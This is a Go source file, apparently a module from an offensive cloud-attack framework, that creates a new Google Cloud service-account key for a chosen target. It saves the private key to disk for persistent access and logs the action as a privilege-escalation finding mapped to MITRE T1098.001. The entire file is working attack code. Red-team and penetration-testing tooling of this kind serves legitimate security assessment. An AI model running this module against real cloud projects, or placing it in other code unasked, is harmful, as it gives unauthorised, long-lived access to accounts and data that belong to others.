package iam

import (
	"context"
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"

	iamv1 "google.golang.org/api/iam/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateSAKeyCreate{})
}

// EscalateSAKeyCreate creates a new key for a target service account.
type EscalateSAKeyCreate struct{}

func (m *EscalateSAKeyCreate) Info() module.Info {
	return module.Info{
		Name:         "privesc.iam.escalate-sa-key-create",
		Tactic:       module.TacticPrivesc,
		Service:      "iam",
		Description:  "Create a new key for a target service account for persistent access",
		RequiresAuth: true,
		AttackID:     "T1098.001",
	}
}

func (m *EscalateSAKeyCreate) Run(ctx module.RunContext) error {
	targetSA := ctx.Flags["target-sa"]
	if targetSA == "" {
		output.Warn("Usage: run privesc.iam.escalate-sa-key-create --target-sa <email>")
		output.Info("Tip: run 'recon.iam.list-principals' first to discover service accounts.")
		return nil
	}

	outputDir := ctx.Flags["output"]
	if outputDir == "" {
		outputDir = "."
	}

	svc, err := iamv1.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create IAM client: %w", err)
	}

	output.Info("Creating key for SA: %s", targetSA)

	key, err := svc.Projects.ServiceAccounts.Keys.Create(
		fmt.Sprintf("projects/-/serviceAccounts/%s", targetSA),
		&iamv1.CreateServiceAccountKeyRequest{
			KeyAlgorithm:   "KEY_ALG_RSA_2048",
			PrivateKeyType: "TYPE_GOOGLE_CREDENTIALS_FILE",
		},
	).Do()
	if err != nil {
		return fmt.Errorf("create SA key: %w", err)
	}

	// Decode and save the key.
	keyData, err := base64.StdEncoding.DecodeString(key.PrivateKeyData)
	if err != nil {
		return fmt.Errorf("decode key: %w", err)
	}

	outPath := filepath.Join(outputDir, fmt.Sprintf("%s-key.json", targetSA))
	if err := os.WriteFile(outPath, keyData, 0o600); err != nil {
		return fmt.Errorf("write key file: %w", err)
	}

	output.Success("Key created and saved to: %s", outPath)
	output.Warn("Key name: %s", key.Name)
	output.Warn("Expires: %s", key.ValidBeforeTime)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.iam.escalate-sa-key-create",
			Severity:    module.SevCritical,
			Title:       "SA key created for privilege escalation",
			Description: fmt.Sprintf("Created new key for %s, saved to %s", targetSA, outPath),
			Resource:    targetSA,
		}
	}

	return nil
}
